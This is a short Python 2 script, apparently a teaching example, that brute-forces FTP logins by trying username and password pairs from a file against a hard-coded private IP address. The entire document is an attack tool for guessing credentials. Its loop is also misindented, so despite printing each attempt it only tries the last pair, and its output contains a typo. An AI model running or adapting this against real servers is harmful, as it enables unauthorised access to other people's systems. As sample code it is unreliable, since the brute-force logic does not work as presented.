# brute force using credentials
import ftplib

def bruteLogin(hostname, passwdFile):
    passF = open(passwdFile, 'r')
    for line in passF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print '[+] Trying: '+ userName + ' ' + passWord
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login(userName, passWord)
        print '\n[*] ' + str(hostname) + ' FTP Login SucceededL: ' +\
        userName + ' ' + passWord
        ftp.quit()
        return (userName, passWord)
    except Exception, e:
        print '\n[-] '+ str(hostname) + ' FTP brute force Login Failed'
        return (None, None)
host = '192.168.95.179'
passwdFile = 'userpass.txt'
bruteLogin(host, passwdFile)
